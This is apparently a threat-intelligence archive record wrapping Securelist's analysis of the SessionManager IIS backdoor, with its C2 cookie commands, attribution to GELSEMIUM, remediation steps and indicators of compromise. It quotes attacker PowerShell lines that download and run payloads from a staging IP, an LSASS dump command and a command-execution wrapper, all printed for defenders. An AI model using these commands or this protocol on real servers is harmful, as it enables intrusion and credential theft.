@@ -1,0 +1,218 @@
+{
+    "id": "13d2df82-639a-4333-8423-017b5842cb05",
+    "created_at": "2023-01-12T15:08:41.858118Z",
+    "updated_at": "2025-03-27T02:16:09.44291Z",
+    "deleted_at": null,
+    "sha1_hash": "6528bdcbf271fbb98da79aa767fd0abf13f0cb3c",
+    "title": "2022-06-30 - The SessionManager IIS backdoor- a possibly overlooked GELSEMIUM artefact",
+    "authors": "",
+    "file_creation_date": "2022-07-18T18:05:22Z",
+    "file_modification_date": "2022-07-18T18:05:22Z",
+    "file_size": 726439,
+    "plain_text": "# A possibly overlooked GELSEMIUM artefact\n\n**securelist.com/the-sessionmanager-iis-backdoor/106868/**\n\nAuthors\n\n[Pierre Delcher](https://securelist.com/author/pierredelcher/)\n\n[Following on from our earlier Owowa discovery, we continued to hunt for more backdoors potentially](https://securelist.com/owowa-credential-stealer-and-remote-access/105219/)\n[set up as malicious modules within IIS, a popular web server edited by Microsoft. And we didn’t come](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-development-overview/creating-native-code-http-modules)\nback empty-handed…\n\nIn 2021, we noticed a trend among several threat actors for deploying a backdoor within IIS after\n[exploiting one of the ProxyLogon-type vulnerabilities within Microsoft Exchange servers. Dropping an](https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/)\nIIS module as a backdoor enables threat actors to maintain persistent, update-resistant and relatively\nstealthy access to the IT infrastructure of a targeted organization; be it to collect emails, update further\nmalicious access, or clandestinely manage compromised servers that can be leveraged as malicious\ninfrastructure.\n\nIn early 2022, we investigated one such IIS backdoor: SessionManager. In late April 2022, most of the\nsamples we identified were still not flagged as malicious in a popular online file scanning service, and\nSessionManager was still deployed in over 20 organizations.\n\nSessionManager has been used against NGOs, government, military and industrial organizations in\nAfrica, South America, Asia, Europe, Russia and the Middle East, starting from at least March 2021.\n[Because of the similar victims, and use of a common OwlProxy variant, we believe the malicious IIS](https://lab52.io/blog/chimera-apt-updates-on-its-owlproxy-malware/)\n\n\n-----\n\n[module may have been leveraged by the GELSEMIUM threat actor, as part of espionage operations.](https://www.welivesecurity.com/wp-content/uploads/2021/06/eset_gelsemium.pdf)\n\n## SessionManager: there’s yet another unwanted module in your web server\n\n[Developed in C++, SessionManager is a malicious native-code IIS module whose aim is to be loaded](https://docs.microsoft.com/en-us/iis/web-development-reference/native-code-development-overview/creating-native-code-http-modules)\nby some IIS applications, to process legitimate HTTP requests that are continuously sent to the\nserver.\n\nSuch malicious modules usually expect seemingly legitimate but specifically crafted HTTP requests\nfrom their operators, trigger actions based on the operators’ hidden instructions if any, then\ntransparently pass the request to the server for it to be processed just like any other request (see\nFigure 1).\n\nAs a result, such modules are not easily spotted by usual monitoring practices: they do not necessarily\ninitiate suspicious communications to external servers, receive commands through HTTP requests to\na server that is specifically exposed to such processes, and their files are often placed in overlooked\nlocations that contain a lot of other legitimate files.\n\n**_Figure 1. Malicious IIS module processing requests_**\n\nSessionManager offers the following capabilities that, when combined, make it a lightweight persistent\ninitial access backdoor:\n\nReading, writing to and deleting arbitrary files on the compromised server.\nExecuting arbitrary binaries from the compromised server, also known as “remote command\nexecution”.\nEstablishing connections to arbitrary network endpoints that can be reached by the\ncompromised server as well as reading and writing in such connections\n\n\n-----\n\nWe identified several variants of the SessionManager module, all including remains of their\ndevelopment environment (PDB paths) and compilation dates that are consistent with observed\nactivity timeframes. This demonstrates a continuous effort to update the backdoor:\n\nV0: the compilation date of the oldest sample we identified (MD5\n5FFC31841EB3B77F41F0ACE61BECD8FD) is from March 2021. The sample contains a\ndevelopment path (PDB path): “C:\\Users\\GodLike\\Desktop\\t\\t4\\StripHeadersmaster\\x64\\Release\\sessionmanagermodule.pdb”. This indicates the SessionManager\n[developer might have used the public source code of the StripHeaders IIS module as a template](https://github.com/dionach/stripheaders)\nto first design SessionManager.\nV1: a later sample (MD5 84B20E95D52F38BB4F6C998719660C35) has a compilation date\nfrom April 2021, and a PDB path set as\n“C:\\Users\\GodLike\\Desktop\\t\\t4\\SessionManagerModule\\x64\\Release\\sessionmanagermodule.pdb”.\nV2: another sample (MD5 4EE3FB2ABA3B82171E6409E253BDDDB5) has a compilation date\nfrom August 2021, and a PDB path which is identical to the previous V1, except for the project\nfolder name which is “SessionManagerV2Module”.\nV3: finally, the last sample we could identify (MD5 2410D0D7C20597D9B65F237F9C4CE6C9)\nis dated from September 2021 and has a project folder name set to\n“SessionManagerV3Module”.\n\n## SessionManager command and control protocol details\n\nSessionManager hooks itself in the HTTP communications processing of the web server by checking\nHTTP data just before IIS answers to an HTTP request (see Figure 2). In this specific step of HTTP\nprocessing, SessionManager can check the whole content of the HTTP request from a client (an\noperator), and modify the answer that is sent to the client by the server (to include results from\nbackdoor activities), as previously shown in Figure 1.\n\n**_Figure 2. SessionManager registration within the web server upon loading_**\n\n[Commands are passed from an operator to SessionManager using a specific HTTP cookie name. The](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)\nanswer from the backdoor to an operator will usually be inserted in the body of the server HTTP\nresponse. If the expected cookie name and value format are not found in an HTTP request from a\nclient, the backdoor will do nothing, and processing will continue as if the malicious module did not\nexist.\n\nThe specific HTTP cookie name that is checked by SessionManager is “SM_SESSIONID” in variants\nbefore V2 (excluded), and “SM_SESSION” after. Formatting the exact command names and\narguments also depends on the backdoor variant:\n\n\n-----\n\nBefore V2 (excluded), most of the commands and associated parameters are all passed as a\nvalue[1] of the required SessionManager HTTP cookie, such as for a file reading command:\n\n1 Cookie: SM_SESSIONID=ReadFile-afile.txt\n\nThe remote execution and the file writing functionalities require additional command data to be\npassed within the HTTP request body.\nAfter V2 (included), only the command name is passed as a value of the required\nSessionManager HTTP cookie. Command parameters are passed using names and values[2] of\nadditional cookies, while some commands still require data to be passed within the HTTP body\nas well. For example, the HTTP cookies definition for a file-reading command looks like this:\n\n1 Cookie: SM_SESSION=GETFILE;FILEPATH=afile.txt;\n\nThe results of executed commands are returned as body data within HTTP responses. Before V2\n(excluded), SessionManager did not encrypt or obfuscate command and control data. Starting with V2\n(included), an additional “SM_KEY” cookie can be included in HTTP requests from operators: if so, its\nvalue will be used as an XOR key to encode results that are sent by SessionManager.\n\nThe comprehensive list of commands for the most recent variant of SessionManager is presented\nbelow:\n\n\n**Command**\n**name**\n\n**(SM_SESSION**\n**cookie value)**\n\n\n**Command**\n**parameters**\n\n**(additional**\n**cookies)**\n\n\nGETFILE FILEPATH: path\nof file to be read.\nFILEPOS1:\noffset at which to\nstart reading,\nfrom file start.\nFILEPOS2:\nmaximum\nnumber of bytes\nto read.\n\n\n**Associated capability**\n\nRead the content of a file on the compromised server and\nsend it to the operator as an HTTP binary file named cool.rar.\n\n\n-----\n\nPUTFILE FILEPATH: path\nof file to be\nwritten.\nFILEPOS1:\noffset at which to\nstart writing.\n\nFILEPOS2:\noffset reference.\n\nFILEMODE:\nrequested file\naccess type.\n\nDELETEFILE FILEPATH: path\nof file to be\ndeleted.\n\nFILESIZE FILEPATH: path\nof file to be\nmeasured.\n\n\nWrite arbitrary content to a file on the compromised server.\nThe data to be written in the specified file is passed within the\nHTTP request body.\n\nDelete a file on the compromised server.\n\nGet the size (in bytes) of the specified file.\n\n\nCMD None. Run an arbitrary process on the compromised server. The\nprocess to run and its arguments are specified in the HTTP\nrequest body using the format: <executable\npath>\\t<arguments>. The standard output and error data from\nprocess execution are sent back as plain text to the operator in\nthe HTTP response body.\n\nPING None. Check for SessionManager deployment. The “Wokring OK”\n(sic.) message will be sent to the operator in the HTTP\nresponse body.\n\n\nS5CONNECT S5HOST:\nhostname to\nconnect to\n(exclusive with\nS5IP).\nS5PORT: offset\nat which to start\nwriting.\n\nS5IP: IP\naddress to\nconnect to if no\nhostname is\ngiven (exclusive\nwith S5HOST).\n\nS5TIMEOUT:\nmaximum delay\nin seconds to\nallow for\nconnection.\n\n\nConnect from compromised host to a specified network\nendpoint, using a created TCP socket. The integer identifier of\nthe created and connected socket will be returned as the value\nof the S5ID cookie variable in the HTTP response, and the\nstatus of the connection will be reported in the HTTP response\nbody.\n\n\n-----\n\nS5WRITE S5ID: identifier\nof the socket to\nwrite to, as\nreturned by\nS5CONNECT.\n\nS5READ S5ID: identifier\nof the socket to\nread from, as\nreturned by\nS5CONNECT.\n\nS5CLOSE S5ID: identifier\nof the socket to\nclose, as\nreturned by\nS5CONNECT.\n\n\nWrite data to the specified connected socket. The data to be\nwritten in the specified socket is passed within the HTTP\nrequest body.\n\nRead data from the specified connected socket. The read data\nis sent back within the HTTP response body.\n\nTerminate an existing socket connection. The status of the\noperation is returned as a message within the HTTP response\nbody.\n\n\n## Post-deployment activities by SessionManager operators\n\nOnce deployed, SessionManager is leveraged by operators to further profile the targeted environment,\ngather in-memory passwords and deploy additional tools. Notably, operators used Powershell\nWebClient functionality from a SessionManager remote execution command to download from the\nserver IP address 202.182.123[.]185, between March and April 2021, such as:\n\n\n1\n\n2\n\n3\n\n\npowershell \"(New-Object\nNet.WebClient).DownloadFile('hxxp://202.182.123[.]185/Dll2.dll','C:\\Windows\\Temp\\win32.dll')\"\n\npowershell \"(New-Object\nNet.WebClient).DownloadFile('hxxp://202.182.123[.]185/ssp.exe','C:\\Windows\\Temp\\win32.exe')\"\n\nC:\\Windows\\Temp\\win32.exe C:\\Windows\\Temp\\win32.dll\n\n\nAdditional tools that operators attempted to download and execute from SessionManager include a\n[PowerSploit-based reflective loader for the](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) [Mimikatz DLL,](https://blog.gentilkiwi.com/mimikatz) [Mimikatz SSP,](https://github.com/jas502n/mimikat_ssp) [ProcDump, as well as a](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)\nlegitimate memory dump tool from Avast (MD5 36F2F67A21745438A1CC430F2951DFBC). The latter\n[has been abused by SessionManager operators to attempt to read the memory of the LSASS](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10))\nprocess, which would enable authentication secrets collection on the compromised server. Operators\n[also tried to leverage the Windows built-in Minidump capability to do the same thing.](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/)\n\nIn order to avoid detection by security products (which obviously failed in our case), SessionManager\noperators sometimes attempted additional malicious execution by running launcher scripts through the\n[Windows services manager command line. Starting from November 2021, operators tried to leverage](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc754599(v=ws.11))\ncustom [PyInstaller-packed Python scripts to obfuscate command execution attempts. This kind of](https://pypi.org/project/pyinstaller/)\nPython script source code would look as follows:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n\nimport os, sys, base64, codecs\n\nfrom subprocess import PIPE, Popen\n\ndef cmdlet(c):\n\ncmdlet = c.split('(-)')\n\np = Popen(cmdlet, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)\n\n_out, _err = p.communicate()\n\nreturn (codecs.decode(_out, errors='backslashreplace'), codecs.decode(_out,\nerrors='backslashreplace'))\n\nprint('\\n---------------------\\n'.join(cmdlet(sys.argv[1])))\n\n\nAnd as a result, command execution attempts through this tool were made as follows:\n\n1 C:\\Windows\\Temp\\vmmsi.exe cmd.exe(-)/c(-)\"winchecksec.exe -accepteula -ma lsass.exe\nseclog.dmp\"\n\nIn one case in December 2021, SessionManager operators attempted to execute an additional tool\nthat we unfortunately could not retrieve. This tool was set up to communicate with the IP address\n207.148.109[.]111, which is most likely part of the operators’ infrastructure.\n\n## SessionManager targets\n\nWe managed to identify 34 servers that were compromised by a SessionManager variant, belonging\nto 24 distinct organizations in Argentina, Armenia, China, Djibouti, Equatorial Guinea, Eswatini, Hong\nKong, Indonesia, Kenya, Kuwait, Malaysia, Nigeria, Pakistan, Poland, the Russian Federation, Saudi\nArabia, Taiwan, Thailand, Turkey, the United Kingdom and Vietnam (see Figure 3).\n\nUsually, we could only identify one compromised server per organization, and only one compromised\norganization per location; but Vietnam is the main exception as several compromised servers from\nseveral organizations could be identified there. Amongst the identified organizations, 20 were still\nrunning a compromised server as late as June 2022.\n\nAdditionally, we managed to identify an earlier target of the same campaign that was not compromised\nwith SessionManager, in Laos in mid-March 2021 (see Attribution).\n\n_Figure 3. Map of organizations targeted by SessionManager campaign (darker color indicates a higher_\n_[concentration) (download)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/29125927/01-en-the-sessionmanager-iis-backdoor.png)_\n\nMost of the compromised servers belong to government or military organizations, but we also\nidentified international and national non-government organizations, an electronic equipment\nmanufacturer, a shipbuilding company, a health care and surgery group, a local road transportation\ncompany, a state oil company, a state electricity company, a sales kiosk manufacturer, and an ERP\nsoftware editor.\n\n\n-----\n\n## Attribution\n\nFirst, we identified an additional malicious binary (MD5 5F15B17FA0E88D40D4E426E53CF94549,\ncompilation date set in April 2020) that shares a common PDB path part with SessionManager\nsamples (“C:\\Users\\GodLike\\Desktop\\t\\”). This binary is a password stealer designed to grab Windows\nusers’ passwords when they are changed. It is compiled from a Chinese-documented public source\ncode called Hook-PasswordChangeNotify. Unfortunately, we could not retrieve any additional details\nabout this binary exploitation, but it may have been developed by the same developer as\nSessionManager.\n\nThen in mid-March 2021, shortly before our first SessionManager detection, we noticed that a threat\nactor leveraged ProxyLogon-type vulnerabilities against an Exchange Server in Laos to deploy a web\nshell and conduct malicious activities using the same Mimikatz SSP and Avast memory dump tools\nthat we described above (see Post-deployment activities from SessionManager operators). Not only\nwere the tool samples the same, but one of them was downloaded from the staging server that\nSessionManager operators leveraged (202.182.123[.]185). As a result, we believe with medium to\nhigh confidence that those malicious activities were conducted by the same threat actor behind\nSessionManager.\n\nInterestingly, the threat actor attempted to download and execute two samples of an HTTP server-type\nbackdoor called OwlProxy on the compromised server in Laos. We then discovered that at least one\nof those OwlProxy samples had also been downloaded from 202.182.123[.]185 on at least two\nSessionManager-compromised servers in late March 2021. As a result, we believe with medium to\nhigh confidence that the threat actor who operates SessionManager also used or tried to use those\nOwlProxy samples before introducing SessionManager.\n\nThe specific OwlProxy variant of the samples we retrieved has only been documented as part of\nGELSEMIUM’s activities. We also noticed that SessionManager targets (see SessionManager targets)\npartly overlap with GELSEMIUM victims. As a result, we believe that SessionManager might be\noperated by GELSEMIUM, but not necessarily only GELSEMIUM.\n\n## Getting rid of IIS malicious modules\n\n[Once again, the activities described here show that the ProxyLogon-type vulnerabilities have been](https://securelist.com/owowa-credential-stealer-and-remote-access/105219/)\nwidely used since March 2021 to deploy relatively simple yet very effective persistent server accesses,\nsuch as the SessionManager backdoor.\n\nWhile some of the ProxyLogon exploitation by advanced threat actors was documented right away,\n[notably by Kaspersky, SessionManager was poorly detected for a year. Facing massive and](https://securelist.com/ghostemperor-from-proxylogon-to-kernel-mode/104407/)\nunprecedented server-side vulnerability exploitation, most cybersecurity actors were busy\ninvestigating and responding to the first identified offences. As a result, it is still possible to discover\nrelated malicious activities months or years later, and that will probably be the case for a long time.\n\nIn any case, we cannot stress enough that IIS servers must undergo a complete and dedicated\ninvestigation process after the gigantic opportunity that ProxyLogon-style vulnerabilities exposed,\nstarting in 2021. Loaded IIS modules can be listed for a running IIS instance by using the IIS Manager\n\n\n-----\n\nGUI, or from the IIS appcmd [command line. If a malicious module is identified, we recommend the](https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview#querying-adding-and-removing-modules-using-the-iis-manager)\nfollowing template of actions (merely deleting the malicious module file will not be enough to get rid of\nit):\n\nTake a volatile memory snapshot on the currently running system where IIS is executed.\nRequest assistance from forensics and incident response experts if required.\nStop the IIS server, and ideally disconnect the underlying system from publicly reachable\nnetworks.\nBack up all files and logs from your IIS environment, to retain data for further incident response.\nCheck that the backups can be opened or extracted successfully.\nUsing IIS Manager or the appcmd command tool, remove every reference of the identified\nmodule from apps and server configurations. Manually review associated IIS XML configuration\nfiles to make sure any reference to the malicious modules have been removed – manually\nremove the references in XML files otherwise.\nUpdate the IIS server and underlying operating system to make sure no known vulnerabilities\nremain exposed to attackers.\nRestart the IIS server and bring the system online again.\n\nIt is advised to then proceed with malicious module analysis and incident response activities (from the\nmemory snapshot and backups that have been prepared), in order to understand how the identified\nmalicious tools have been leveraged by their operators.\n\n## Indicators of Compromise\n\n**SessionManager**\n\n[5FFC31841EB3B77F41F0ACE61BECD8FD](https://opentip.kaspersky.com/5FFC31841EB3B77F41F0ACE61BECD8FD/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[84B20E95D52F38BB4F6C998719660C35](https://opentip.kaspersky.com/84B20E95D52F38BB4F6C998719660C35/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[4EE3FB2ABA3B82171E6409E253BDDDB5](https://opentip.kaspersky.com/4EE3FB2ABA3B82171E6409E253BDDDB5/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[2410D0D7C20597D9B65F237F9C4CE6C9](https://opentip.kaspersky.com/2410D0D7C20597D9B65F237F9C4CE6C9/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**Mimikatz runners**\n\n[95EBBF04CEFB39DB5A08DC288ADD2BBC](https://opentip.kaspersky.com/95EBBF04CEFB39DB5A08DC288ADD2BBC/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[F189D8EFA0A8E2BEE1AA1A6CA18F6C2B](https://opentip.kaspersky.com/F189D8EFA0A8E2BEE1AA1A6CA18F6C2B/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**PyInstaller-packed process creation wrapper**\n\n[65DE95969ADBEDB589E8DAFE903C5381](https://opentip.kaspersky.com/65DE95969ADBEDB589E8DAFE903C5381/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**OwlProxy variant samples**\n\n[235804E3577EA3FE13CE1A7795AD5BF9](https://opentip.kaspersky.com/235804E3577EA3FE13CE1A7795AD5BF9/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[30CDA3DFF9123AD3B3885B4EA9AC11A8](https://opentip.kaspersky.com/30CDA3DFF9123AD3B3885B4EA9AC11A8/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**Possibly related password stealer**\n[5F15B17FA0E88D40D4E426E53CF94549](https://opentip.kaspersky.com/5F15B17FA0E88D40D4E426E53CF94549/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**Files paths**\n\n%PROGRAMFILES%\\Microsoft\\Exchange\nServer\\V15\\ClientAccess\\OWA\\Auth\\SessionManagerModule.dll\n\n%PROGRAMFILES%\\Microsoft\\Exchange\n\n\n-----\n\nServer\\V15\\FrontEnd\\HttpProxy\\bin\\SessionManagerModule.dll\n%WINDIR%\\System32\\inetsrv\\SessionManagerModule.dll\n\n%WINDIR%\\System32\\inetsrv\\SessionManager.dll\nC:\\Windows\\Temp\\ExchangeSetup\\Exch.ps1\n\nC:\\Windows\\Temp\\Exch.exe\n\nC:\\Windows\\Temp\\vmmsi.exe\n\nC:\\Windows\\Temp\\safenet.exe\n\nC:\\Windows\\Temp\\upgrade.exe\n\nC:\\Windows\\Temp\\exupgrade.exe\n\nC:\\Windows\\Temp\\dvvm.exe\n\nC:\\Windows\\Temp\\vgauth.exe\n\nC:\\Windows\\Temp\\win32.exe\n\n**PDB Paths**\n\nC:\\Users\\GodLike\\Desktop\\t\\t4\\StripHeaders-master\\x64\\Release\\sessionmanagermodule.pdb\n\nC:\\Users\\GodLike\\Desktop\\t\\t4\\SessionManagerModule\\x64\\Release\\sessionmanagermodule.pdb\n\nC:\\Users\\GodLike\\Desktop\\t\\t4\\SessionManagerV2Module\\x64\\Release\\sessionmanagermodule.pdb\n\nC:\\Users\\GodLike\\Desktop\\t\\t4\\SessionManagerV3Module\\x64\\Release\\sessionmanagermodule.pdb\n\nC:\\Users\\GodLike\\Desktop\\t\\t0\\Hook-PasswordChangeNotifymaster\\HookPasswordChange\\x64\\Release\\HookPasswordChange.pdb\n\n**IP addresses**\n\n202.182.123[.]185 (Staging server, between 2021-03 and 04 at least)\n207.148.109[.]111 (Unidentified infrastructure)\n\n[1] As per RFC:2109 (title 4.1) and its successor RFC:2965 (title 3.1), values of HTTP cookies that\n\ncontain characters such as filepath backslashes should be quoted. SessionManager does not care to\ncomply with referenced RFCs, and does not unquote such values, so will fail to process a cookie\nvalue that contains filepaths including backslashes as sent by standard HTTP clients.\n\n\n\n[2] The previous cookie value limitations (see footnote 1) still exist with V2+. In addition, any cookie\n\nvariable definition to be processed by SessionManager V2+ must be terminated with a ‘;’ character,\neven if there is only one cookie variable set.\n\n[APT](https://securelist.com/tag/apt/)\n[Backdoor](https://securelist.com/tag/backdoor/)\n[Malware Descriptions](https://securelist.com/tag/malware-descriptions/)\n[Malware Technologies](https://securelist.com/tag/malware-technologies/)\n[Microsoft Exchange](https://securelist.com/tag/microsoft-exchange/)\n[Targeted attacks](https://securelist.com/tag/targeted-attacks/)\n[Vulnerabilities and exploits](https://securelist.com/tag/vulnerabilities-and-exploits/)\n\nAuthors\n\n[Pierre Delcher](https://securelist.com/author/pierredelcher/)\n\nThe SessionManager IIS backdoor\n\n\n-----\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-30 - The SessionManager IIS backdoor- a possibly overlooked GELSEMIUM artefact.pdf"
+    ],
+    "report_names": [
+        "2022-06-30 - The SessionManager IIS backdoor- a possibly overlooked GELSEMIUM artefact.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "873a6c6f-a4d1-49b3-8142-4a147d4288ef",
+            "created_at": "2022-10-25T16:07:23.455744Z",
+            "updated_at": "2025-03-27T02:02:09.811933Z",
+            "deleted_at": null,
+            "main_name": "Chimera",
+            "aliases": [
+                "Operation Skeleton Key"
+            ],
+            "source_name": "ETDA:Chimera",
+            "tools": [
+                "Agentemis",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "SkeletonKeyInjector",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "77874718-7ad2-4d15-9831-10935ab9bcbe",
+            "created_at": "2022-10-25T15:50:23.619911Z",
+            "updated_at": "2025-03-27T02:00:55.50722Z",
+            "deleted_at": null,
+            "main_name": "Gelsemium",
+            "aliases": [
+                "Gelsemium"
+            ],
+            "source_name": "MITRE:Gelsemium",
+            "tools": [
+                "Gelsemium",
+                "Mimikatz"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "2d4d2356-8f9e-464d-afc6-2403ce8cf424",
+            "created_at": "2023-01-06T13:46:39.290101Z",
+            "updated_at": "2025-03-27T02:00:03.041564Z",
+            "deleted_at": null,
+            "main_name": "Gelsemium",
+            "aliases": [
+                "狼毒草"
+            ],
+            "source_name": "MISPGALAXY:Gelsemium",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "f88b16bc-df4b-48e7-ae35-f4117240ff24",
+            "created_at": "2022-10-25T15:50:23.556699Z",
+            "updated_at": "2025-03-27T02:00:55.499173Z",
+            "deleted_at": null,
+            "main_name": "Chimera",
+            "aliases": [
+                "Chimera"
+            ],
+            "source_name": "MITRE:Chimera",
+            "tools": [
+                "PsExec",
+                "esentutl",
+                "Mimikatz",
+                "Cobalt Strike"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "f0eca237-f191-448f-87d1-5d6b3651cbff",
+            "created_at": "2024-02-06T02:00:04.140087Z",
+            "updated_at": "2025-03-27T02:00:03.323578Z",
+            "deleted_at": null,
+            "main_name": "GhostEmperor",
+            "aliases": [
+                "FamousSparrow",
+                "UNC2286",
+                "Salt Typhoon",
+                "RedMike"
+            ],
+            "source_name": "MISPGALAXY:GhostEmperor",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "b5550c4e-943a-45ea-bf67-875b989ee4c4",
+            "created_at": "2022-10-25T16:07:23.675771Z",
+            "updated_at": "2025-03-27T02:02:09.918749Z",
+            "deleted_at": null,
+            "main_name": "Gelsemium",
+            "aliases": [
+                "Operation NightScout",
+                "Operation TooHash"
+            ],
+            "source_name": "ETDA:Gelsemium",
+            "tools": [
+                "ASPXSpy",
+                "ASPXTool",
+                "Agentemis",
+                "BadPotato",
+                "CHINACHOPPER",
+                "China Chopper",
+                "Chrommme",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "FireWood",
+                "Gelsemine",
+                "Gelsenicine",
+                "Gelsevirine",
+                "JuicyPotato",
+                "OwlProxy",
+                "Owowa",
+                "SAMRID",
+                "SessionManager",
+                "SinoChopper",
+                "SpoolFool",
+                "SweetPotato",
+                "WolfsBane",
+                "cobeacon",
+                "reGeorg"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "d390d62a-6e11-46e5-a16f-a88898a8e6ff",
+            "created_at": "2024-12-28T02:01:54.899899Z",
+            "updated_at": "2025-03-27T02:02:10.122415Z",
+            "deleted_at": null,
+            "main_name": "Salt Typhoon",
+            "aliases": [
+                "Earth Estries",
+                "FamousSparrow",
+                "GhostEmperor",
+                "RedMike",
+                "Salt Typhoon",
+                "UNC2286"
+            ],
+            "source_name": "ETDA:Salt Typhoon",
+            "tools": [
+                "Agentemis",
+                "Backdr-NQ",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "Crowdoor",
+                "Cryptmerlin",
+                "Deed RAT",
+                "Demodex",
+                "FamousSparrow",
+                "FuxosDoor",
+                "GHOSTSPIDER",
+                "HemiGate",
+                "MASOL RAT",
+                "Mimikatz",
+                "NBTscan",
+                "NinjaCopy",
+                "ProcDump",
+                "PsExec",
+                "PsList",
+                "SnappyBee",
+                "SparrowDoor",
+                "TrillClient",
+                "WinRAR",
+                "Zingdoor",
+                "certutil",
+                "certutil.exe",
+                "cobeacon",
+                "nbtscan"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536121,
+    "ts_updated_at": 1743041769,
+    "ts_creation_date": 1658167522,
+    "ts_modification_date": 1658167522,
+    "files": {
+        "pdf": "https://archive.orkl.eu/6528bdcbf271fbb98da79aa767fd0abf13f0cb3c.pdf",
+        "text": "https://archive.orkl.eu/6528bdcbf271fbb98da79aa767fd0abf13f0cb3c.txt",
+        "img": "https://archive.orkl.eu/6528bdcbf271fbb98da79aa767fd0abf13f0cb3c.jpg"
+    }
+}
